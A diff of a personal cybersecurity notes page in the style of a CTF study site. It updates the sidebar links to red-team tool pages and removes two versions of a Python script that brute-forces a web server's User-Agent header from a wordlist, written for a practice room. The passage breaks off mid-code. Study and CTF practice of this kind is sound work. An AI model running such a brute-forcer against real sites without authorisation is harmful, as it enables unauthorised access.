@@ -72,6 +72,8 @@ const thebe_selector_output = ".output, .cell_output"
     <script>DOCUMENTATION_OPTIONS.pagename = 'MyPrograms/WebBruteForce';</script>
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="Formatting Notes" href="../Other/FormattingNotes.html" />
+    <link rel="prev" title="File Downloader" href="FileDownloader.html" />
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <meta name="docsearch:language" content="en"/>
   </head>
@@ -170,6 +172,7 @@ const thebe_selector_output = ".output, .cell_output"
 <li class="toctree-l2"><a class="reference internal" href="../Goals/DFIR/WindowsEventViewer.html">Event Viewer</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/DFIR/WindowsProcesses.html">Windows Process</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/DFIR/WindowsRegistry.html">Windows Registry</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../Goals/DFIR/Zimmerman.html">Zimmerman</a></li>
 </ul>
 </li>
 <li class="toctree-l1 has-children"><a class="reference internal" href="../Goals/EDR/EDR_Home.html">Endpoint Detection &amp; Response</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-2"><i class="fa-solid fa-chevron-down"></i></label><ul>
@@ -204,6 +207,7 @@ const thebe_selector_output = ".output, .cell_output"
 <li class="toctree-l2"><a class="reference internal" href="../Goals/General/Kerberos.html">Kerberos Attacks</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/General/NFS.html">NFS</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/General/OWASP10.html">OWASP Top 10 - 2021</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../Goals/General/OSquery.html">OS Query</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/General/Passwords.html">Passwords</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/General/PowerShell.html">PowerShell</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/General/SSH.html">SSH</a></li>
@@ -258,19 +262,45 @@ const thebe_selector_output = ".output, .cell_output"
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/RedTeam/CredentialAccess/CredentialAccess_Home.html">Credential Access</a></li>
-<li class="toctree-l2"><a class="reference internal" href="../Goals/RedTeam/Discovery/Discovery_Home.html">Discovery Home</a></li>
-<li class="toctree-l2"><a class="reference internal" href="../Goals/RedTeam/Execution/Execution_Home.html">Execution</a></li>
-<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/InitialAccess/InitialAccess_Home.html">Initial Access</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-13"><i class="fa-solid fa-chevron-down"></i></label><ul>
-<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/InitialAccess/Netcat.html">Netcat</a></li>
-<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/InitialAccess/SocialEngineeringToolkit.html">Social Engineering Toolkit (SET)</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/Discovery/Discovery_Home.html">Discovery Home</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-13"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Discovery/Ettercap.html">Ettercap &amp; Bettercap</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Discovery/Impacket.html">Impacket</a></li>
 </ul>
 </li>
-<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/LateralMovement/LateralMovement_Home.html">Lateral Movement</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-14"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/Execution/Execution_Home.html">Execution</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-14"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Execution/Armitage.html">Armitage</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Execution/Metasploit.html">Metasploit Framework</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Execution/Msfvenom.html">Msfvenom</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Execution/SearchSploit.html">Searchsploit</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/InitialAccess/InitialAccess_Home.html">Initial Access</a><input class="toctree-checkbox" id="toctree-checkbox-15" name="toctree-checkbox-15" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-15"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/InitialAccess/Netcat.html">Netcat</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/InitialAccess/SocialEngineeringToolkit.html">Social Engineering Toolkit (SET)</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/InitialAccess/StabiliseShell.html">Stabilising a shell</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/LateralMovement/LateralMovement_Home.html">Lateral Movement</a><input class="toctree-checkbox" id="toctree-checkbox-16" name="toctree-checkbox-16" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-16"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/LateralMovement/Kerbrute.html">Kerbrute</a></li>
 <li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/LateralMovement/Rubeus.html">Rubeus</a></li>
 </ul>
 </li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/RedTeam/Persistence/Persistence_Home.html">Persistence</a></li>
-<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/Recon/Recon_Home.html">Recon</a><input class="toctree-checkbox" id="toctree-checkbox-15" name="toctree-checkbox-15" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-15"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/PrivilegeEscalation_Home.html">Privelige Escalation</a><input class="toctree-checkbox" id="toctree-checkbox-17" name="toctree-checkbox-17" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-17"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/BloodHound.html">BloodHound</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/Evil-WinRM.html">Evil-WinRM</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/LES.html">Linux Exploit Suggester</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/LinEnum.html">LinEnum</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/LinPeas.html">LinPeas</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/LinuxFun.html">Linux Fun</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/LinuxPrivEsc.html">Linux Privelige Escalation</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/Powerup.html">Powerup</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/WindowsFun.html">Windows ‘Fun’ Stuff</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/WindowsPersistence.html">Windows Persistence</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/PrivilegeEscalation/WindowsPrivEsc.html">Windows PrivEsc</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/RedTeam/Recon/Recon_Home.html">Recon</a><input class="toctree-checkbox" id="toctree-checkbox-18" name="toctree-checkbox-18" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-18"><i class="fa-solid fa-chevron-down"></i></label><ul>
 <li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Recon/Maltego.html">Maltego</a></li>
 <li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Recon/Nmap.html">Nmap</a></li>
 <li class="toctree-l3"><a class="reference internal" href="../Goals/RedTeam/Recon/Nping.html">Nping</a></li>
@@ -279,32 +309,73 @@ const thebe_selector_output = ".output, .cell_output"
 </li>
 </ul>
 </li>
-<li class="toctree-l1 has-children"><a class="reference internal" href="../Goals/Steganography/Steganography_Home.html">Steganography</a><input class="toctree-checkbox" id="toctree-checkbox-16" name="toctree-checkbox-16" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-16"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../Goals/Steganography/Steganography_Home.html">Steganography</a><input class="toctree-checkbox" id="toctree-checkbox-19" name="toctree-checkbox-19" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-19"><i class="fa-solid fa-chevron-down"></i></label><ul>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/Steganography/Binwalk.html">Binwalk</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../Goals/ThreatIntelligence/ThreatIntelligence_Home.html">Threat Intelligence</a></li>
-<li class="toctree-l1 has-children"><a class="reference internal" href="../Goals/VulnerabilityManagement/VulnerabilityManagement_Home.html">Vulnerability Management</a><input class="toctree-checkbox" id="toctree-checkbox-17" name="toctree-checkbox-17" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-17"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../Goals/VulnerabilityManagement/VulnerabilityManagement_Home.html">Vulnerability Management</a><input class="toctree-checkbox" id="toctree-checkbox-20" name="toctree-checkbox-20" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-20"><i class="fa-solid fa-chevron-down"></i></label><ul>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/VulnerabilityManagement/Nessus.html">Nessus</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/VulnerabilityManagement/OpenVAS.html">OpenVAS</a></li>
 </ul>
 </li>
-<li class="toctree-l1 has-children"><a class="reference internal" href="../Goals/WebExploitation/WebExploitation_Home.html">Web Exploitation</a><input class="toctree-checkbox" id="toctree-checkbox-18" name="toctree-checkbox-18" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-18"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../Goals/WebExploitation/WebExploitation_Home.html">Web Exploitation</a><input class="toctree-checkbox" id="toctree-checkbox-21" name="toctree-checkbox-21" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-21"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../Goals/WebExploitation/BurpSuite/BurpSuite_Home.html">Burp Suite</a><input class="toctree-checkbox" id="toctree-checkbox-22" name="toctree-checkbox-22" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-22"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/WebExploitation/BurpSuite/BurpIntruder.html">Burp Suite - Intruder</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../Goals/WebExploitation/BurpSuite/BurpRepeater.html">Burp Suite - Repeater</a></li>
+</ul>
+</li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/WebExploitation/GoBuster.html">Gobuster</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/WebExploitation/LFI.html">LFI</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/WebExploitation/Nikto.html">Nikto</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/WebExploitation/RequestForgery.html">Request Forgeries</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../Goals/WebExploitation/SQLinjection.html">SQL Injection</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/WebExploitation/Wfuzz.html">WFUZZ</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../Goals/WebExploitation/XSS.html">XSS</a></li>
 </ul>
 </li>
 </ul>
-<p aria-level="2" class="caption" role="heading"><span class="caption-text">Walkthroughs</span></p>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Home Lab Setup</span></p>
 <ul class="nav bd-sidenav">
-<li class="toctree-l1 has-children"><a class="reference internal" href="../PracticeRooms/HoloLive/HoloLive.html">HoloLive</a><input class="toctree-checkbox" id="toctree-checkbox-19" name="toctree-checkbox-19" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-19"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l1"><a class="reference internal" href="../HomeLab/HomeLab.html">HomeLab</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../HomeLab/BuildingSnort.html">Building Snort</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../HomeLab/BuildingSnortv2.html">Building Snort V2</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../HomeLab/BuildingSplunk.html">Building Splunk</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../HomeLab/OpenKylin.html">OpenKylin</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">My Programs</span></p>
+<ul class="current nav bd-sidenav">
+<li class="toctree-l1 current active has-children"><a class="reference internal" href="MyPrograms.html">My Programs</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-23" name="toctree-checkbox-23" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-23"><i class="fa-solid fa-chevron-down"></i></label><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="FileDownloader.html">File Downloader</a></li>
+<li class="toctree-l2 current active"><a class="current reference internal" href="#">Web Brute Force Program</a></li>
+</ul>
+</li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Other (Mainly things I still need to do...)</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1"><a class="reference internal" href="../Other/FormattingNotes.html">Formatting Notes</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Other/ThingsToDo.html">Things to Do</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Other/CloudAzure.html">Cloud Providers - Azure</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Other/CTFpages.html">CTF Links</a></li>
+</ul>
+<p aria-level="2" class="caption" role="heading"><span class="caption-text">Practice Rooms</span></p>
+<ul class="nav bd-sidenav">
+<li class="toctree-l1 has-children"><a class="reference internal" href="../PracticeRooms/SideQuest2023.html">Advent Of Cyber Side Quest 2023</a><input class="toctree-checkbox" id="toctree-checkbox-24" name="toctree-checkbox-24" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-24"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/AoCsidequest/AoCsq1.html">Advent Of Cyber - Side Quest 1</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/AoCsidequest/AoCsq2.html">Advent Of Cyber - Side Quest 2</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../PracticeRooms/HoloLive/HoloLive.html">HoloLive</a><input class="toctree-checkbox" id="toctree-checkbox-25" name="toctree-checkbox-25" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-25"><i class="fa-solid fa-chevron-down"></i></label><ul>
 <li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/HoloLive/HoloLive_Task8.html">HoloLive Walkthrough - Task 8</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/HoloLive/HoloLive_Task9.html">HoloLive Walkthrough - Task 9</a></li>
 <li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/HoloLive/HoloLive_Task10.html">HoloLive Walkthrough - Task 10</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../PracticeRooms/KustoDetectiveAgency/Detective_S1_C0.html">Kusto Detective Agency Season 1 (Challenge 0)</a><input class="toctree-checkbox" id="toctree-checkbox-26" name="toctree-checkbox-26" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-26"><i class="fa-solid fa-chevron-down"></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/KustoDetectiveAgency/Detective_S1_C1.html">Kusto Detective Agency Season 1 (Challenge 1)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/KustoDetectiveAgency/Detective_S1_C2.html">Kusto Detective Agency Season 1 (Challenge 2)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/KustoDetectiveAgency/Detective_S1_C4.html">Kusto Detective Agency Season 1 (Challenge 4)</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/KustoDetectiveAgency/Detective_S1_C5.html">Kusto Detective Agency Season 1 (Challenge 5)</a></li>
 </ul>
 </li>
 <li class="toctree-l1"><a class="reference internal" href="../PracticeRooms/AgentSudo.html">Agent Sudo</a></li>
@@ -318,25 +389,6 @@ const thebe_selector_output = ".output, .cell_output"
 <li class="toctree-l1"><a class="reference internal" href="../PracticeRooms/Tomghost.html">Tomghost</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../PracticeRooms/Ignite.html">Ignite</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../PracticeRooms/Labtainers/Labtainers.html">Labtainers</a></li>
-<li class="toctree-l1 has-children"><a class="reference internal" href="../PracticeRooms/SideQuest2023.html">Advent Of Cyber Side Quest 2023</a><input class="toctree-checkbox" id="toctree-checkbox-20" name="toctree-checkbox-20" type="checkbox"/><label class="toctree-toggle" for="toctree-checkbox-20"><i class="fa-solid fa-chevron-down"></i></label><ul>
-<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/AoCsidequest/AoCsq1.html">Advent Of Cyber - Side Quest 1</a></li>
-<li class="toctree-l2"><a class="reference internal" href="../PracticeRooms/AoCsidequest/AoCsq2.html">Advent Of Cyber - Side Quest 2</a></li>
-</ul>
-</li>
-</ul>
-<p aria-level="2" class="caption" role="heading"><span class="caption-text">Home Lab Setup</span></p>
-<ul class="nav bd-sidenav">
-<li class="toctree-l1"><a class="reference internal" href="../HomeLab/HomeLab.html">HomeLab</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../HomeLab/BuildingSnort.html">Building Snort</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../HomeLab/BuildingSplunk.html">Building Splunk</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../HomeLab/OpenKylin.html">OpenKylin</a></li>
-</ul>
-<p aria-level="2" class="caption" role="heading"><span class="caption-text">Non Hacking Notes</span></p>
-<ul class="nav bd-sidenav">
-<li class="toctree-l1"><a class="reference internal" href="../Other/FormattingNotes.html">Formatting Notes</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../Other/ThingsToDo.html">Things to Do</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../Other/CloudAzure.html">Cloud Providers - Azure</a></li>
-<li class="toctree-l1"><a class="reference internal" href="../Other/CTFpages.html">CTF Links</a></li>
 </ul>
 
     </div>
@@ -507,141 +559,11 @@ It was then extended for the Mr Robot room when Hydra was taking forever to reac
 <section id="v1-0">
 <h2>V1.0<a class="headerlink" href="#v1-0" title="Permalink to this heading">#</a></h2>
 <p>This was made to brute force the header in the Agent Sudo room. it uses a static fule but reads in a wordlist and URL</p>
-<div class="cell tag_skip-execution docutils container">
-<div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># A Bruteforce software for html headers (because burp is too slow)</span>
-<span class="c1"># Part of The-Cyber-Toolkit</span>
-<span class="c1"># V1.0</span>
-
-<span class="c1"># Planned features</span>
-<span class="c1"># Provide URL, and example page in .txt format (with replacement character on each side)</span>
-<span class="c1"># Provide wordlist, one per line</span>
-<span class="c1"># Import the headers, replacing with special char</span>
-
-
-<span class="c1"># Simple Example, defined page and replace location</span>
-
-<span class="kn">import</span> <span class="nn">requests</span>
-
-<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Where is your wordlist?: &quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="s2">&quot;/usr/share/wordlists/seclists/Usernames/Names/names.txt&quot;</span><span class="p">)</span>
-<span class="n">target</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;What is the target URL?: &quot;</span><span class="p">)</span>
-<span class="n">responses_to_ignore</span> <span class="o">=</span> <span class="p">[</span><span class="mi">200</span><span class="p">]</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Wordlist:&quot;</span><span class="p">,</span> <span class="n">wordlist</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TargetURL:&quot;</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
-
-<span class="n">loopcount</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
-    <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># drop the /n at the end</span>
-    <span class="n">loopcount</span> <span class="o">+=</span> <span class="mi">1</span>
-    <span class="n">head_params</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="s2">&quot;Host&quot;</span> <span class="p">:</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;User-Agent&quot;</span> <span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">word</span><span class="p">),</span>
-    <span class="s2">&quot;Accept&quot;</span> <span class="p">:</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Accept-Language&quot;</span> <span class="p">:</span> <span class="s2">&quot;en-US&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Accept-Encoding&quot;</span> <span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Connection&quot;</span> <span class="p">:</span> <span class="s2">&quot;Close&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Upgrade-Insecure-Requests&quot;</span> <span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
-
-    <span class="p">}</span>
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">head_params</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="n">responses_to_ignore</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">loopcount</span><span class="p">,</span> <span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;found in:&quot;</span><span class="p">,</span> <span class="n">loopcount</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ResponseCode:&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Word from Wordlist:&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
-<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;END&quot;</span><span class="p">)</span>
-</pre></div>
-</div>
-</div>
-</div>
 <hr>
 </section>
 <section id="v2-0">
 <h2>V2.0<a class="headerlink" href="#v2-0" title="Permalink to this heading">#</a></h2>
 <p>The first implimenation to brute force with threads. It just throws many threads at it. Fast but not reliable</p>
-<div class="cell tag_skip-execution docutils container">
-<div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># A Bruteforce software for html headers (because burp is too slow)</span>
-<span class="c1"># Part of The-Cyber-Toolkit</span>
-<span class="c1"># V2.0</span>
-
-<span class="c1"># Implimented Features</span>
-<span class="c1"># Provide URL and wordlist</span>
-<span class="c1"># Use pre-defined header to bruteforce</span>
-<span class="c1"># Simple reporting on what is found </span>
-
-<span class="c1"># Planned features</span>
-<span class="c1"># Provide URL, and example page in .txt format (with replacement character on each side)</span>
-<span class="c1"># Import the headers, replacing with special char</span>
-
-
-<span class="c1"># Threading the simple request</span>
-
-<span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">threading</span>
-<span class="kn">import</span> <span class="nn">time</span>
-
-<span class="k">def</span> <span class="nf">request_thread</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">word</span><span class="p">):</span>
-    <span class="n">head_params</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="s2">&quot;Host&quot;</span> <span class="p">:</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;User-Agent&quot;</span> <span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">word</span><span class="p">),</span>
-    <span class="s2">&quot;Accept&quot;</span> <span class="p">:</span> <span class="s2">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Accept-Language&quot;</span> <span class="p">:</span> <span class="s2">&quot;en-US&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Accept-Encoding&quot;</span> <span class="p">:</span> <span class="s2">&quot;gzip, deflate&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Connection&quot;</span> <span class="p">:</span> <span class="s2">&quot;Close&quot;</span><span class="p">,</span>
-    <span class="s2">&quot;Upgrade-Insecure-Requests&quot;</span> <span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
-
-    <span class="p">}</span>
-    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">head_params</span><span class="p">)</span>
-
-    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="ow">in</span> <span class="n">responses_to_ignore</span><span class="p">:</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-        <span class="nb">print</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">responses_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-        <span class="n">interesting_responses</span><span class="o">.</span><span class="n">append</span><span class="p">([</span><span class="n">word</span><span class="p">],</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
-        <span class="n">responses_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">acquire</span><span class="p">()</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------&quot;</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;found in:&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ResponseCode:&quot;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Word from Wordlist:&quot;</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span>
-        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;--------------&quot;</span><span class="p">)</span>
-        <span class="n">print_lock</span><span class="o">.</span><span class="n">release</span><span class="p">()</span>
-
-
-<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Where is your wordlist?: &quot;</span><span class="p">)</span> <span class="ow">or</span> <span class="s2">&quot;/usr/share/wordlists/seclists/Usernames/Names/names.txt&quot;</span><span class="p">)</span>
-<span class="n">target</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;What is the target URL?: &quot;</span><span class="p">)</span>
-<span class="n">responses_to_ignore</span> <span class="o">=</span> <span class="p">[</span><span class="mi">200</span><span class="p">]</span>
-
